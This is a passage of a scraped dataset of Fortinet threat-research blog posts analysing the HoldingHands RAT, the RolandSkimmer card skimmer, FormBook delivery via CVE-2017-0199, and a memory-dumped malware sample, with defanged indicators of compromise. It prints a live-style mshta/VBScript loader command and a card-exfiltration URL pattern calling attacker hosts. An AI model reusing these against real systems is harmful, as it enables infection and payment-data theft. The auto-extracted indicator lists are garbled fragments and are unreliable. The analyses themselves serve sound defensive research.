forcollalautriv.xmland converts the filename to getVirtualAlloc, the API used in decryption. dxpi.txtexecutes initial setups for the next stage, including anti-VM, privilege escalation, and installation. Subkey: SOFTWARE\\MsUpTas Value name: State In addition, it drops other files extracted from the ZIP file to C:\\Program Files (x86)\\WindowsPowerShell\\Update. Original filename After Filename of dropped file Description TaskServer.exe The same file as the條例檔案. It’s copied as System32\\msvchost.dat. The malicious payload. Shellcode based on HoldingHands. Shellcode loader formsgDb.dat. EGLProtect.dll The legitimate DLL file for條例檔案. config32.bin Unused. It renames the legitimateversion.dllasconfVersion.dlland writes the decrypted data ofconfig32.binto SysWOW64\\version.dllif it’s used. config64.bin It renames the legitimateTimeBrokerClient.dllasBrokerClientCallback.dlland writes the decrypted data ofconfig64.bintoTimeBrokerClient.dll. Binary file that is used bymsvchost.dat. In addition, it terminates ifBrokerClientCallback.dllandBlend.dllare present, indicating that the computer is infected. Blend.dllis thelegitimatemsimg32.dllthat is later renamed bymsvchost.dat. After installation, it executesTaskServer.exe, which loadsdokan2.dllvia side-loading. Dokan2.dllthendecrypts and executes the shellcode inmsgDb.datfor the next stage. Original Filename Filename of dropped file Description system.dat, mymsc.nls The malicious payload. Shellcode loader formsgDb.dat. The legitimate DLL file for條例檔案. TaskServer.exe taskyhost.exe The same file as the條例檔案. msimg32.dll Shellcode loader forsystem.dat. MsgDb.datimplements C2 tasks for setting registry keys, data collection, and module download from the HoldingHands RAT. It also sends heartbeat packets to ensure the connection is active. Below is the packet's data structure, excluding the header. The packets frommsgDb.datand the C2 server follow this structure. Payload(optional) Magic: 0xDEADBEEFData size: The size of the command and the payload The first outgoing packet doesn’t contain a payload. TheKNELcommand indicates that the packet is from a kernel module. As a response, the C2 server sends a data collection request. After sending the user information,msgDb.datsends heartbeat packets and waits for further instructions. The response command is 0x00. To get the install date, it reads theInstallDatevalue from the SOFTWARE\\HHClient registry key. If this is the first time the C2 server queries for this information, it writes the current time to the value. The registry values set by other commands areCommentandGroupfrom the SOFTWARE\\HHClient registry key. If theCommentvalue is not set, it writesdefaultto the packet. Once all data is downloaded,msgDb.datexecutes the module. Otherwise, it sends 0x0B to ask for more data. During our analysis, we identified three modules delivered by the C2 server, including two remote desktop modules and a file manager.msgDb.datcalls the only export function, ModuleEntry, to proceed to the next stage of the attack. Below are the commands in the initial packet: Module name Description Remote desktop Remote desktop File manager The packets follow the same structure asmsgDb.dat. The modules' image debug directories indicate that they also belong to the HoldingHands RAT. Some modules appear to be simplified versions, as indicated by the term 'jingjianban' (meaning 'lite version' in Chinese) in the Image Debug Directory. In addition towinos, which we covered in February 2025, and HoldingHands, discussed in this article, this threat group frequently employs Gh0stCringe. Figures 5 through 7 include screenshots of files in this attack chain. This analysis revealed further malware samples associated with the attack that began targeting Taiwan in January 2025. The attack chain comprises numerous snippets of shellcode and loaders, making the attack flow complex. However, the purpose of these samples is to execute a malicious payload that accesses a C2 server to receive further instructions. Across winos, HoldingHands, and Gh0stCring, this threat group continuously evolves its malware and distribution strategies. FortiGuard will continue to monitor these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent. A6DC!tr.dldrW64/ShellcodeRunner. ARG!trW64/Agent. FIN!trW64/HHAgent. BEE8!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have installed the latest updates for these products are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm malicious macros in documents. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]91[.]85[.]204154[.]86[.]22[.]47156[.]251[.]17[.]17206[.]238[.]179[.]173206[.]238[.]220[.]60206[.]238[.]199[.]22154[.]91[.]85[.]201206[.]238[.]221[.]182206[.]238[.]196[.]32154[.]91[.]64[.]45206[.]238[.]115[.]207156[.]251[.]17[.]12107[.]149[.]253[.]183 00-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]com6-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfte-1340224852[.]cos[.]ap-guangzhou[.]myqcloud[.]comcq1tw[.]toptwcz[.]protwczb[.]comtwnc[.]inktwnic[.]icutwnic[.]inktwnic[.]ltdtwnic[.]xintwsa[.]toptwsw[.]cctwsw[.]clubtwsw[.]infotwsw[.]inktwsw[.]ltdtwsw[.]protwsww[.]viptwsww[.]xintwswz[.]toptwswzz[.]xintwtgtw[.]nettwzfw[.]vip 6558dfb070421c674b377a0a6090593fa0c44d5b0dec5325a648583f92175ce2d3a270d782e62574983b28bd35076b569a0b65236e7f841a63b0558f2e3a231ca8430ce490d5c5fab1521f3297e2d277ee7e7c49e7357c208878f7fd5f7639317d3f352ded285118e916336da6e6182778a54dc88d4fb7353136f028ac9b81e0143f434e3a2cac478fb672b77d6c04cdf25287d234a52ee157f4f1a2b06f8022c25e80cd10e7741b5f3e0b246822e0af5237026d5227842f6cf4907daa0398487263550339c2a35f356bb874fb3a619b76f2d602064beada75049e7c2927a6dc a8b6c06daeede6199e69f4cafd79299219def5bf913a31829dede98a8ad2aaa96fcd6aef0678d3c6d5f8c2cb660356b25f68c73e7ee24fbb721216a547d17ffaed72721837c991621639b4e86ffe0c2693ef1a545741b5513d204a1e3e008d8c65edd9e1a38fd3da79c8a556eb2c7c595125ffec9f7483e2e6e189a08cc5d4120a0375648bc9368bccfd3d657d26976d5b1f975381d1858d001404d807334058e809582faccdd27337aa46b4a11dd11f5d0c7d7428ebdc8c895ea80777e4da5f59d2433264d8ec9e9797918be3aa7132dbeb71e141f6e5c64c0d6f1cb4452934 ac957ba4796f06c4bf0c0afb8674bbeb30eb95cef85bc68ced3ee1aa30e3acff9296adb71bc98140a59b19f68476d45dbb38cc60b9e263d07d14e7178f195989636c2ccffce7d4591b0d5708469070b839f221400b38189c734004641929ae0531ffa4e3638c9e094275051629cc3ac0a8c7d6ae8415bbfcacc4c605c7f0df39da3deea591b59b1a0f7e11db2f729a263439a05f3e8b0de97bbac99154297cea e2269b38655a4d75078362856c16594e195cd647c56b8c55883b8e1286baa65852632d9e24f42c4651cf8db3abc37845e693818d64ab0b11c235eddf8e011b2f7200155f3e30dbbd4c4c26ce2c7bd4878ab992b619d80b43c0bd9e17390082fce516b102a2a6001eafb055e42feb9000691e2353c7e87e34ddaa99d7d8af16fda9ddd4e4d54336ce110fdc769ff7c4940f8d89b45ee8dc24f56fc3ea00c18873a12d17cca038cdbf79b72356e5d20b17722c7b20bd2ee308601bac901890f3f4b1ac2178c90c8eafd8121d21acbae7a0eb0cbc156d4a5f692f44b28856a23481a6c1629b4450f713b02d24f088c4f26b0416c6a7924dcf0477425f3a67a2e3ff3ce81c163ddedb132116cdf92aae197ced0b94f3fc3d1036f5c41b084a256a03a19fdfc131e8fbe063289c83a3cdefb9fb9fb6f1f92c83b892d3519a381623dbdb15f45f69f863510986fb2198a8a6b3d55d8ccc8a2ed4bb30bc27bdd1bf151cbf1a7938f61a9905e1b151c7a5f925a2ce3870b7c3e80f6e0fc07715bdc258b7f42c6949c6d8ecf648bacca08cde568f11ec2663221a97dae5fbf01218e8775a FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/threat-group-targets-companies-in-taiwan",
      "scraped_at": "2025-07-20T13:41:12.585402",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ymsc",
          "helegitimatemsimg32",
          "fconfig32",
          "xpi",
          "ymsvchost",
          "ecryptsdxpi",
          "ormsgDb",
          "xecutesTaskServer",
          "smsgDb",
          "egitimateTimeBrokerClient",
          "onfig64",
          "fBrokerClientCallback",
          "okan2",
          "orkernel32",
          "onfig32",
          "oaddokan2",
          "ystem",
          "oadsdokan2",
          "askyhost",
          "sgDb",
          "svchost",
          "egitimateversion",
          "ersion",
          "GLProtect",
          "whsOqnbdrr",
          "simg32",
          "askServer",
          "nmsgDb",
          "fconfig64",
          "orsystem",
          "rommsgDb",
          "orcollalautriv",
          "hekernel32",
          "ndxpi",
          "anager",
          "lend"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7963988919667591
    }
  },
  {
    "id": "Fortinet_64727",
    "source": "Fortinet",
    "title": "RolandSkimmer: Silent Credit Card Thief Uncovered",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High Web-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection. The attacker first spreads a malicious ZIP file named “faktura_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura_1065170.lnk.” This shortcut covertly executes the following hidden command: C:\\WiNDOws\\SYsTEM32\\MShTA.exe vbscript:execute(\"SeT mi1=CReATeobjECt(\\\"msxmL2. SErverXMlHTtp.6.0\\\"):mi1. OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa. AsPX\\\",faLSe:mi1. SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1. REsponSEtEXt,\\\"#\\\", R)):\")(wiNDoW. ClosE) The page “ipa. AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands. Below is a network traffic example showing both the regular communication and the encoded commands received from the server. The encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts. First, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path. It then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments. To target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.” The following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities. The attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites. The extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions: This combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception. The background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code. To generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions. The script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—<imaage> instead of a valid <img> or <image> tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js. The background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads. The retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.” The malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5). After detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden <a> elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft. Once the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number): hxxps://bg3dsec[.]com/<randomized str>? S=<useridentifier>-<site>&D=<captured form data>?&N=<credit card number> Attackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS). The critical component of this attack lies in the maliciously crafted LNK file with the following arguments: --load-extension=”%LOCALAPPDATA%\\s2ch97” ----mark-non-secure-as=disabled. The LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment. The attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.” These decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation. By leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled. Once all the browsers’ related settings are complete, mshta.exe is killed. Upon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented. These logs included status messages such as: These logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly. “RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information. The attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity. The malware described in this report are detected and blocked byFortiGuard Antivirusas: LNK/Agent.96F1!trJS/Agent. SOM!trVBS/Agent. ABUE!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. invsetmx[.]comfzhivka-001-site1[.]btempurl[.]comexmkleo[.]combg3dsec[.]comzzigi20-001-site1.atempurl.comtopclima-001-site1.itempurl.comrinootracebg-001-site1.etempurl.commgproperties-001-site1.itempurl.comkleoti-001-site1.htempurl.com 80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f17086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0 4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2cd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53c02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb45810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered",
      "scraped_at": "2025-07-20T13:41:20.761324",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ShTA",
          "",
          "s6",
          "eg1",
          "omzzigi20-001-site1",
          "s1",
          "omrinootracebg-001-site1",
          "omkleoti-001-site1",
          "zhivka-001-site1",
          "shta",
          "omtopclima-001-site1",
          "eg3",
          "sedge",
          "ch3",
          "ch1",
          "ackground",
          "anifest",
          "ackground2",
          "ommgproperties-001-site1"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4899328859060403
    }
  },
  {
    "id": "Fortinet_16175",
    "source": "Fortinet",
    "title": "How a Malicious Excel File (CVE-2017-0199) Delivers the FormBook Payload",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Control and Collect Sensitive Information from a Victim’s DeviceSeverity level:Critical FortiGuard Labs recently observed a high-severity phishing campaign targeting old version Office Application users through malicious email attachments. The emails deliver an Excel file designed to exploit theCVE-2017-0199vulnerability, a known flaw in old version Microsoft Office's OLE (Object Linking and Embedding) functionality. The malware being spread in this campaign is FormBook, an information-stealing malware known for its ability to capture sensitive data, including login credentials, keystrokes, and clipboard information. Upon opening the malicious Excel file, the malware performs a series of operations, ultimately running the FormBook payload. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The phishing campaign starts with an email disguised as a sales order urging the recipient to open an attached Excel document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. CVE-2017-0199 is a logic vulnerability found in older versions of the Office Application (Office 2007/2010 /2013 /2016). When a user opens the attached Office document targeting this vulnerability, the program sends an HTTP request to a remote server to retrieve a malicious HTA file. The program then uses COM objects to find the application/HTA file handler, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script. Figure 2 shows how CVE-2017-0199 works: We opened the Office document from the email attachment using a compression program, which allowed us to directly view the OLE object content, as shown in Figure 3. If we had opened the Office document within a vulnerable version of Office, it would have triggered CVE-2017-0199, causing the download and execution of the linked content. As you can see, this is a very long URL. However, when accessing it normally, we don't need to pay attention to the content between the protocol and the '@' symbol. This allows us to obtain the actual URL we need. (hxxps[:]//agr[.]my/P6bJNr) Figure 4 shows the discovery of the shortened URL. When this link is accessed, it triggers a 302 redirect that jumps to the actual destination address. If you would like to learn this vulnerability in greater depth, this article provides a more thorough analysis:An Inside Look at CVE-2017-0199 – HTA and Scriptlet File Handler Vulnerability CVE-2017-0199 is a vulnerability dating back eight years, for which official patches have already been released. Nevertheless, due to the inherent challenges of vulnerability management and remediation—encompassing outdated software systems, overburdened IT teams, organizational negligence, or technical incompetence—organizations that fail to promptly update their systems, apply patches inconsistently, or implement security measures carelessly remain susceptible to exploitation of this vulnerability. We can see that the downloaded script is an HTA file (Figure 5), with its main execution logic being a segment of base64-encoded content. After decoding the base64 content, we found that its core functionality is to download a new file, place it in the %APPDATA% directory, and then execute it. (Figure 6) By analyzing sections of the obtained sample, we observed that its .rsrc section contains an unformatted resource data entry named “SCRIPT,” as shown in Figure 7. Examining its content revealed that it begins with the byte sequence “A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D”, which is characteristic of executable files generated by Aut2Exe from AutoIt scripts. Using a debugger for dynamic analysis, we attempted to examine how the sample decrypts the content of the SCRIPT resource and executes the payload, as shown in Figure 8. After initially reading and verifying the \"SCRIPT\" resource, the sample uses the IsDebuggerPresent API for anti-debugging measures, as shown in Figure 9. If it detects that the program is being debugged, it will only output, \"This is a third-party compiled AutoIt script.\" Afterwards, the sample reads the \"SCRIPT\" resource again and decrypts its contents, as shown in Figure 10. After thorough analysis, we discovered that the script decodes the encoded content using 0x1Em and extracts a file called “springmaker” from itself to the %TEMP% directory. It then calls CallWindowProc to run the decoded content, as shown in Figure 11. By examining the content of the “springmaker” file and decompiling what CallWindowProc executes, we discovered that the “springmaker” file is XORed with the string “3NQXSHDTVT2DPK06”, as shown in Figure 12. By applying the same XOR operation using that same string, we can restore the original file. At this point, we have finally obtained the core payload, which is the FormBook malware, as shown in Figure 13. If you would like to learn more about FormBook, here is a recent analysis:Infostealer Malware FormBook Spread via Phishing Campaign – Part II This is a serious phishing campaign targeting Windows users. The attackers send emails with malicious Excel attachments that exploit the CVE-2017-0199 vulnerability to deploy the FormBook malware. The attack process involves distributing malicious Excel files through phishing emails and exploiting CVE-2017-0199 to download and execute malicious HTA files. The HTA file downloads and executes \"sihost.exe,\" which in turn extracts \"springmaker.\" Finally, the \"springmaker\" file is decoded into the FormBook malware. The entire process is shown in Figure 14. This attack aims to take control of victims' devices and steal sensitive information, posing a significant threat. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS. Office. OLE.autolink. Code. Execution”. FortiGuard Antivirus service detects the malicious Excel document, the HTA file, the malicious sihost.exe file as well as the decrypted FormBook with the following AV signatures. MSExcel/CVE_2017_0199. G1!exploitVBS/Obfuscated. AO!trAutoIt/Injector. GKX!trW32/Formbook. AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the free NSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp[:]//172[.]245[.]123[.]32/xampp/hh/wef[.]htahxxp[:]//172[.]245[.]123[.]32/199/sihost[.]exe [AprilSAO2025.xls]33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427 [wef.hta]2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14 [siHOST.exe]7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF [springmaker]A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D [FormBook / Decrypted springmaker]3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/how-a-malicious-excel-file-cve-2017-0199-delivers-the-formbook-payload",
      "scraped_at": "2025-07-20T13:41:29.489349",
      "indicators": {
        "ip_address": [],
        "domain": [
          "prilSAO2025",
          "shta",
          "ihost",
          "LE",
          "iHOST",
          "ef"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "2BFBF6792CA46219259424EFBBBEE09DDBE6AE8FD9426C50AA0326A530AC5B14",
          "A619B1057BCCB69C4D00366F62EBD6E969935CCA65FA40FDBFE1B95E36BA605D",
          "3843F96588773E2E463A4DA492C875B3241A4842D0C087A19C948E2BE0898364",
          "7E16ED31277C31C0370B391A1FC73F77D7F0CD13CC3BAB0EAA9E2F303B6019AF",
          "33A1696D69874AD86501F739A0186F0E4C0301B5A45D73DA903F91539C0DB427"
        ],
        "cve": [
          "CVE-2017-0199"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6073943661971831
    }
  },
  {
    "id": "Fortinet_29845",
    "source": "Fortinet",
    "title": "Deep Dive into a Dumped Malware without a PE Header",
    "text": "FortiGuard Labs Threat Research This analysis is part of an incident investigation led by the FortiGuard Incident Response Team. We discovered malware that had been running on a compromised machine for several weeks. The threat actor had executed a batch of scripts and PowerShell to run the malware in a Windows process. Although obtaining the original malware executable was difficult, a memory dump of the running malware process and a full memory dump of the compromised machine (the “fullout” file, size 33GB) were successfully acquired. Figure 1 provides detailed file information about the dumped memory file, “fullout,” which we scanned to build a local test environment for analyzing the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The malware was running within a dllhost.exe process with PID 8200. The dumped file is named pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp. The file name reveals that the malware was loaded and deployed in memory at address range 0x1c3eefb0000 to 0x1c3ef029fff. The dumped file is a deployed 64-bit PE (Portable Executable) file. During execution, the Windows Loader reads and parses its DOS and PE headers to load and deploy the PE file. Once deployed, these headers are no longer needed. To evade dumping the malware into a file for analysis by researchers, some malware often corrupts these header regions by overwriting them with zeros (like this one) or random data. As shown in Figure 2, both the DOS and PE headers are corrupted, making it difficult to reconstruct the entire executable from memory. To dynamically analyze the malware, we needed to replicate the compromised system’s environment locally. This required launching the dllhost.exe process in a debugger to serve as a target process for deploying the dumped malware. This would allow us to analyze the malware within a local analysis environment. Preparing the malware to execute properly in this controlled setting involves several complicated steps. The first step is to locate the entry point function (the start function), which is the initial code executed when the malware is loaded into memory by the Windows Loader. While the offset of the entry point function is typically stored in the PE header, this was not the case. Instead, we had to manually locate the entry point (the start function). Based on our experience, the first instruction of the entry function is typically compiled as “sub rsp, 28h,” but other functions may also contain this instruction. However, by dumping the malware in IDA Pro, we were able to search for all occurrences of this instruction in the IDA Pro database. Fortunately, only eight instances of the instruction appeared in the malware (Figure 3). After analysis, we confirmed that the fourth function (at 0x1C3EEFEE0A8) is the entry point. In a newly launched dllhost.exe process, we manually executed some instructions to allocate memory for deploying the dumped malware, as seen in Figure 4. It calls a relevant VirtualAlloc() API with the same base address—0x1C3EEB70000—as seen in the compromised system. Once allocated, the dumped malware was copied into the newly created memory. A PE file’s Import table lists the Windows APIs it depends on. These API loading addresses differ on different Windows systems. To run and analyze the dumped malware in the local system, these addresses needed to be relocated to the ones loaded in the local system. Figure 5 shows part of the Windows API addresses from the Import Table. Based on our analysis, the final API address can be calculated from this information. For instance, the API address at 0x1C3EF0240D0 is 0x1C3EEEE1CE0, as shown in Figure 5. It calculates the API address as 0x7FFD74224630 by executing the following ASM code at address 0x1C3EEEE1CE0h: 001C3EEEE1CE0movr10, 0E528F49552F112B4h 001C3EEEE1CEAmovr11, 0E5288B6826D35484h 001C3EEEE1CF4xorr11, r10 001C3EEEE1CF7jmpr11; 0x7FFD74224630 Using the Volatility tool, we listed the loaded modules in the dllhost.exe process (PID 8200) from the “fullout” file. As you can see in Figure 6, the API at 0x7FFD74224630 is exported from module GDI32.dll. By dumping the GDI32.dll from the “fullout” file and analyzing it, we determined that the API at address 0x7FFD74224630 corresponds to GetObjectW() in the compromised system. In our local test environment, this same API resides at address 0x07FFFF77CB870. For this API, its original address was replaced with the local address. This malware has 257 Windows APIs requiring relocation across 16 modules, including: kernel32.dll shlwapi.dll sspicli.dll shell32.dll advapi32.dll, comctl32.dll crypt32.dll gdiplus.dll userenv.dll For each API in the Import Table, its original address must be replaced with its corresponding local address using the same method used for API GetObjectW(). In addition, we needed to load all the required modules that were not automatically loaded by dllhost.exe. To do this, the API LoadLibraryA() or LoadLibraryW() with the module name must be called to load them into the malware’s memory. Figure 7 shows the malware running in a debugger. The RIP register points to the entry point's address at 0x1C3EEFEE0A8. The debugger also shows some of the relocated Windows API functions at the bottom. Based on our analysis, the malware also required some global variable data located at address 0x1C3EEB7000 with a size of 0x5A000 bytes. We extracted the required global data from the “fullout” file using the Volatility tool and the dd command. We again called the VirtualAlloc() API to allocate a new memory region within the dllhost.exe process at the desired address and size. After successful allocation, the extracted data was copied into the newly allocated memory space, as shown in Figure 8. Static analysis of the malware’s entry point function reveals that the function requires three parameters. The first parameter (RCX) is the base address of the loaded malware, which in this case is 0x1C3EEFB0000. The value of the second parameter (RDX) is 0x1. The third parameter (R8) is a pointer to a 0x30-byte buffer, which can also be extracted from the “fullout” file. We prepared all three parameters accordingly and allocated additional memory to store the 